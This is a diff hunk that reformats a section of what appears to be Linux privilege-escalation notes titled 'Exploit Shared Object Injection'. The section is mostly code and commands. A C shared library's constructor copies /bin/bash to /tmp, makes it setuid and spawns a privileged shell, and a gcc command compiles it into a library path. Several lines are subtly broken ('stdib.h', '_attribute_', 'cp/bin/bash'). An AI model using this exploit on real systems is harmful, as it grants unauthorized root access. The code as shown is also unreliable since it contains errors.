@@ -42,18 +42,18 @@
 
    ## Exploit Shared Object Injection
    
-       mkdir /home/user/.config
+   mkdir /home/user/.config
        
-       Create C file Type Some Commands
+   Create C file Type Some Commands
        
        #include <stdio.h>
        #include <stdib.h>
-    static void inject()_attribute_((constructor));
+       static void inject()_attribute_((constructor));
 
-   void inject(){
+       void inject(){
 
-     system("cp/bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
-}
+       system("cp/bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+       }
 
    gcc -shared -fpic -o /home/user/.config/libcalc.so /home/user/libcalc.c
 
